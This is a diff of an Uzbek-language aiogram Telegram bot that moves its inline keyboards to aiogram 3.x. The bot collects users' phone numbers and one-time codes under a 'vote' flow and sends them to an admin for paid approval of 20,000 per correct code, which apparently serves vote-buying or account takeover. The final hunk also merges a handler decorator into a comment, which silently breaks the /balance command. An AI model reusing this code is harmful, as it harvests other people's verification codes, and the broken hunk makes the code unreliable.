@@ -236,7 +236,7 @@ async def vote_start(message: types.Message):
         parse_mode="HTML"
     )
 
-# ================= 3. TELEFON RAQAM (Kontakt) - Tuzatilgan =================
+# ================= 3. TELEFON RAQAM (Kontakt) =================
 @dp.message(lambda msg: msg.contact is not None)
 async def receive_phone_contact(message: types.Message):
     telegram_id = message.from_user.id
@@ -358,7 +358,6 @@ async def receive_code(message: types.Message):
         if conn:
             await conn.close()
     
-    # Foydalanuvchiga javob
     await message.answer(
         "⏳ Kodingiz qabul qilindi!\nAdmin tekshirib, tasdiqlaydi...",
         reply_markup=user_menu
@@ -369,11 +368,14 @@ async def receive_code(message: types.Message):
         user_info = await bot.get_chat(telegram_id)
         username = user_info.username if user_info.username else "mavjud_emas"
         
-        # 2 TUGMA
-        keyboard = InlineKeyboardMarkup(row_width=2)
-        keyboard.add(
-            InlineKeyboardButton(text="✅ To'g'ri kod (+20 000)", callback_data=f"verify_{telegram_id}_{phone}_{code}"),
-            InlineKeyboardButton(text="❌ Noto'g'ri kod", callback_data=f"reject_{telegram_id}")
+        # ✅ TO'G'RI USUL (aiogram 3.x)
+        keyboard = InlineKeyboardMarkup(
+            inline_keyboard=[
+                [
+                    InlineKeyboardButton(text="✅ To'g'ri kod (+20 000)", callback_data=f"verify_{telegram_id}_{phone}_{code}"),
+                    InlineKeyboardButton(text="❌ Noto'g'ri kod", callback_data=f"reject_{telegram_id}")
+                ]
+            ]
         )
         
         await bot.send_message(
@@ -655,10 +657,14 @@ async def withdraw_phone(message: types.Message):
             user_info = await bot.get_chat(telegram_id)
             username = user_info.username if user_info.username else "mavjud_emas"
             
-            keyboard = InlineKeyboardMarkup(row_width=2)
-            keyboard.add(
-                InlineKeyboardButton(text="✅ To'landi", callback_data=f"withdraw_done_{telegram_id}_{balance}"),
-                InlineKeyboardButton(text="❌ Rad etish", callback_data=f"withdraw_reject_{telegram_id}")
+            # ✅ TO'G'RI USUL (aiogram 3.x)
+            keyboard = InlineKeyboardMarkup(
+                inline_keyboard=[
+                    [
+                        InlineKeyboardButton(text="✅ To'landi", callback_data=f"withdraw_done_{telegram_id}_{balance}"),
+                        InlineKeyboardButton(text="❌ Rad etish", callback_data=f"withdraw_reject_{telegram_id}")
+                    ]
+                ]
             )
             
             await bot.send_message(
@@ -877,8 +883,7 @@ async def broadcast_send(message: types.Message):
         if conn:
             await conn.close()
 
-# ================= 15. BALANS KOMANDASI =================
-@dp.message(Command("balance"))
+# ================= 15. BALANS KOMANDASI =================@dp.message(Command("balance"))
 async def check_balance(message: types.Message):
     if message.from_user.id == ADMIN_ID:
         return
